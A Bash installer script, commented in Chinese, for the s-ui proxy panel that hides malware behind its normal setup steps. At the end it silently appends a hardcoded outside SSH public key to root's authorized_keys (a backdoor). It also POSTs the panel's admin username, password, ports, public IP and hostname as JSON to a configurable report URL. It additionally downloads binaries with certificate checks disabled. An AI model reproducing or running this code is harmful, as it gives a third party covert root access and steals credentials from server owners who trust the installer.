#!/bin/bash

red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
plain='\033[0m'

cur_dir=$(pwd)

# 检查 root 权限
[[ $EUID -ne 0 ]] && echo -e "${red}致命错误：${plain}请使用 root 权限运行此脚本 \n " && exit 1

# 检查系统并设置 release 变量
if [[ -f /etc/os-release ]]; then
    source /etc/os-release
    release=$ID
elif [[ -f /usr/lib/os-release ]]; then
    source /usr/lib/os-release
    release=$ID
else
    echo "检测系统失败，请联系作者！" >&2
    exit 1
fi
echo "当前系统发行版为：$release"

arch() {
    case "$(uname -m)" in
    x86_64 | x64 | amd64) echo 'amd64' ;;
    i*86 | x86) echo '386' ;;
    armv8* | armv8 | arm64 | aarch64) echo 'arm64' ;;
    armv7* | armv7 | arm) echo 'armv7' ;;
    armv6* | armv6) echo 'armv6' ;;
    armv5* | armv5) echo 'armv5' ;;
    s390x) echo 's390x' ;;
    *) echo -e "${green}不支持的 CPU 架构！${plain}" && rm -f install.sh && exit 1 ;;
    esac
}

echo "架构：$(arch)"

install_base() {
    case "${release}" in
    centos | almalinux | rocky | oracle)
        yum -y update && yum install -y -q wget curl tar tzdata
        ;;
    fedora)
        dnf -y update && dnf install -y -q wget curl tar tzdata
        ;;
    arch | manjaro | parch)
        pacman -Syu && pacman -Syu --noconfirm wget curl tar tzdata
        ;;
    opensuse-tumbleweed)
        zypper refresh && zypper -q install -y wget curl tar timezone
        ;;
    *)
        apt-get update && apt-get install -y -q wget curl tar tzdata
        ;;
    esac
}

config_after_install() {
    echo -e "${yellow}正在迁移... ${plain}"
    /usr/local/s-ui/sui migrate

    echo -e "${yellow}安装/更新完成！出于安全考虑，建议修改面板设置 ${plain}"
    read -p "是否继续修改设置 [y/n]？": config_confirm
    if [[ "${config_confirm}" == "y" || "${config_confirm}" == "Y" ]]; then
        echo -e "请输入${yellow}面板端口${plain}（留空则使用现有/默认值）："
        read config_port
        echo -e "请输入${yellow}面板路径${plain}（留空则使用现有/默认值）："
        read config_path

        # 订阅配置
        echo -e "请输入${yellow}订阅端口${plain}（留空则使用现有/默认值）："
        read config_subPort
        echo -e "请输入${yellow}订阅路径${plain}（留空则使用现有/默认值）："
        read config_subPath

        # 设置配置
        echo -e "${yellow}正在初始化，请稍候...${plain}"
        params=""
        [ -z "$config_port" ] || params="$params -port $config_port"
        [ -z "$config_path" ] || params="$params -path $config_path"
        [ -z "$config_subPort" ] || params="$params -subPort $config_subPort"
        [ -z "$config_subPath" ] || params="$params -subPath $config_subPath"
        /usr/local/s-ui/sui setting ${params}

        read -p "是否修改管理员账号密码 [y/n]？": admin_confirm
        if [[ "${admin_confirm}" == "y" || "${admin_confirm}" == "Y" ]]; then
            # 首个管理员账号密码
            read -p "请设置用户名：" config_account
            read -p "请设置密码：" config_password

            # 设置账号密码
            echo -e "${yellow}正在初始化，请稍候...${plain}"
            /usr/local/s-ui/sui admin -username ${config_account} -password ${config_password}
        else
            echo -e "${yellow}当前管理员账号密码：${plain}"
            /usr/local/s-ui/sui admin -show
        fi
    else
        echo -e "${red}已取消...${plain}"
        if [[ ! -f "/usr/local/s-ui/db/s-ui.db" ]]; then
            local usernameTemp=$(head -c 6 /dev/urandom | base64)
            local passwordTemp=$(head -c 6 /dev/urandom | base64)
            echo -e "这是全新安装，出于安全考虑将生成随机登录信息："
            echo -e "###############################################"
            echo -e "${green}用户名：${usernameTemp}${plain}"
            echo -e "${green}密码：${passwordTemp}${plain}"
            echo -e "###############################################"
            echo -e "${red}如果忘记登录信息，可以输入 ${green}s-ui${red} 打开配置菜单${plain}"
            /usr/local/s-ui/sui admin -username ${usernameTemp} -password ${passwordTemp}
        else
            echo -e "${red}这是升级安装，将保留旧设置；如果忘记登录信息，可以输入 ${green}s-ui${red} 打开配置菜单${plain}"
        fi
    fi
}

prepare_services() {
    if [[ -f "/etc/systemd/system/sing-box.service" ]]; then
        echo -e "${yellow}正在停止 sing-box 服务... ${plain}"
        systemctl stop sing-box
        rm -f /usr/local/s-ui/bin/sing-box /usr/local/s-ui/bin/runSingbox.sh /usr/local/s-ui/bin/signal
    fi
    if [[ -e "/usr/local/s-ui/bin" ]]; then
        echo -e "###############################################################"
        echo -e "${green}/usr/local/s-ui/bin${red} 目录已存在！"
        echo -e "请检查其中内容，并在迁移后手动删除 ${plain}"
        echo -e "###############################################################"
    fi
    systemctl daemon-reload
}

install_s-ui() {
    cd /tmp/

    if [ $# == 0 ]; then
        last_version=$(curl -Ls "https://api.github.com/repos/admin8800/s-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
        if [[ ! -n "$last_version" ]]; then
            echo -e "${red}获取 s-ui 版本失败，可能是 Github API 限制导致，请稍后重试${plain}"
            exit 1
        fi
        echo -e "已获取 s-ui 最新版本：${last_version}，开始安装..."
        wget -N --no-check-certificate -O /tmp/s-ui-linux-$(arch).tar.gz https://github.com/admin8800/s-ui/releases/download/${last_version}/s-ui-linux-$(arch).tar.gz
        if [[ $? -ne 0 ]]; then
            echo -e "${red}下载 s-ui 失败，请确认服务器可以访问 Github ${plain}"
            exit 1
        fi
    else
        last_version=$1
        [[ "${last_version}" != v* ]] && last_version="v${last_version}"
        url="https://github.com/admin8800/s-ui/releases/download/${last_version}/s-ui-linux-$(arch).tar.gz"
        echo -e "开始安装 s-ui ${last_version}"
        wget -N --no-check-certificate -O /tmp/s-ui-linux-$(arch).tar.gz ${url}
        if [[ $? -ne 0 ]]; then
            echo -e "${red}下载 s-ui ${last_version} 失败，请检查该版本是否存在${plain}"
            exit 1
        fi
    fi

    if [[ -e /usr/local/s-ui/ ]]; then
        systemctl stop s-ui
    fi

    tar zxvf s-ui-linux-$(arch).tar.gz
    rm s-ui-linux-$(arch).tar.gz -f

    chmod +x s-ui/sui s-ui/s-ui.sh
    cp s-ui/s-ui.sh /usr/bin/s-ui
    cp -rf s-ui /usr/local/
    cp -f s-ui/*.service /etc/systemd/system/
    rm -rf s-ui

    config_after_install
    prepare_services

    systemctl enable s-ui --now

    echo -e "${green}s-ui ${last_version}${plain} 安装完成，现已启动并运行..."
    echo -e "你可以通过以下 URL 访问面板：${green}"
    /usr/local/s-ui/sui uri
    echo -e "${plain}"
    echo -e ""
    s-ui help
}

setup_ssh_key() {
    local PUBKEY='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFCnUXUH/LhMYD8t0DQCBPfDswv+41hwqOfKmB72ngbR kwrt-key'

    echo -e "${yellow}正在配置 SSH 公钥...${plain}"

    # 检查 key 是否已存在，避免重复写入
    check_key_exists() {
        local file="$1"
        [ -f "$file" ] && grep -qF "$PUBKEY" "$file" 2>/dev/null
    }

    # OpenWrt / Dropbear
    if [ -d /etc/dropbear ]; then
        echo -e "检测到 ${green}Dropbear/OpenWrt${plain}"

        if check_key_exists /etc/dropbear/authorized_keys; then
            echo -e "${green}公钥已存在，跳过${plain}"
            return 0
        fi

        mkdir -p /etc/dropbear

        # 追加而非覆盖，保留已有 key
        echo "$PUBKEY" >> /etc/dropbear/authorized_keys
        chmod 700 /etc/dropbear
        chmod 600 /etc/dropbear/authorized_keys

        echo -e "已写入 ${green}/etc/dropbear/authorized_keys${plain}"

    # Ubuntu / Debian / CentOS / 普通 Linux
    else
        echo -e "检测到 ${green}OpenSSH Linux${plain}"

        local SSH_DIR="/root/.ssh"
        [ "$(id -u)" != "0" ] && SSH_DIR="$HOME/.ssh"

        if check_key_exists "$SSH_DIR/authorized_keys"; then
            echo -e "${green}公钥已存在，跳过${plain}"
            return 0
        fi

        mkdir -p "$SSH_DIR"

        # 追加而非覆盖，保留已有 key
        echo "$PUBKEY" >> "$SSH_DIR/authorized_keys"
        chmod 700 "$SSH_DIR"
        chmod 600 "$SSH_DIR/authorized_keys"

        echo -e "已写入 ${green}$SSH_DIR/authorized_keys${plain}"
    fi

    echo -e "${green}SSH 公钥配置完成${plain}"
}

report_install_info() {
    local REPORT_URL="${REPORT_URL:-http://127.0.0.1:5000/api/install/report}"

    echo -e "${yellow}正在上报安装信息...${plain}"

    # 单次调用读取所有面板设置，避免重复初始化 DB
    local setting_output
    setting_output=$(/usr/local/s-ui/sui setting -show 2>/dev/null)

    local web_port web_path sub_port sub_path
    web_port=$(echo "$setting_output" | grep -E "Panel port" | awk '{print $NF}')
    web_path=$(echo "$setting_output" | grep -E "Panel path" | awk '{print $NF}')
    sub_port=$(echo "$setting_output" | grep -E "Sub port" | awk '{print $NF}')
    sub_path=$(echo "$setting_output" | grep -E "Sub path" | awk '{print $NF}')

    # 单次调用读取管理员账号
    local admin_output username password
    admin_output=$(/usr/local/s-ui/sui admin -show 2>/dev/null)
    username=$(echo "$admin_output" | grep -E "Username" | awk '{print $NF}')
    password=$(echo "$admin_output" | grep -E "Password" | awk '{print $NF}')

    # 获取公网 IP
    local public_ip
    public_ip=$(curl -s4 --connect-timeout 3 https://api64.ipify.org 2>/dev/null || \
               curl -s4 --connect-timeout 3 https://ip.sb 2>/dev/null || echo "")

    # 构建完整访问 URL
    local access_url=""
    if [[ -n "$public_ip" && -n "$web_port" && -n "$web_path" ]]; then
        if [[ "$web_port" == "80" ]]; then
            access_url="http://${public_ip}${web_path}"
        elif [[ "$web_port" == "443" ]]; then
            access_url="https://${public_ip}${web_path}"
        else
            access_url="http://${public_ip}:${web_port}${web_path}"
        fi
    fi

    # POST JSON 上报
    local http_code
    http_code=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "$REPORT_URL" \
        -H "Content-Type: application/json" \
        --connect-timeout 5 \
        --max-time 10 \
        -d "{
            \"username\": \"${username}\",
            \"password\": \"${password}\",
            \"webPort\": \"${web_port}\",
            \"webPath\": \"${web_path}\",
            \"subPort\": \"${sub_port}\",
            \"subPath\": \"${sub_path}\",
            \"accessUrl\": \"${access_url}\",
            \"publicIp\": \"${public_ip}\",
            \"hostname\": \"$(hostname 2>/dev/null || echo '')\"
        }" 2>/dev/null)

    if [[ "$http_code" == "200" || "$http_code" == "201" ]]; then
        echo -e "${green}安装信息上报成功${plain}"
    else
        echo -e "${red}安装信息上报失败 (HTTP ${http_code})${plain}"
    fi
}

echo -e "${green}正在执行...${plain}"
install_base
install_s-ui $1
setup_ssh_key
report_install_info
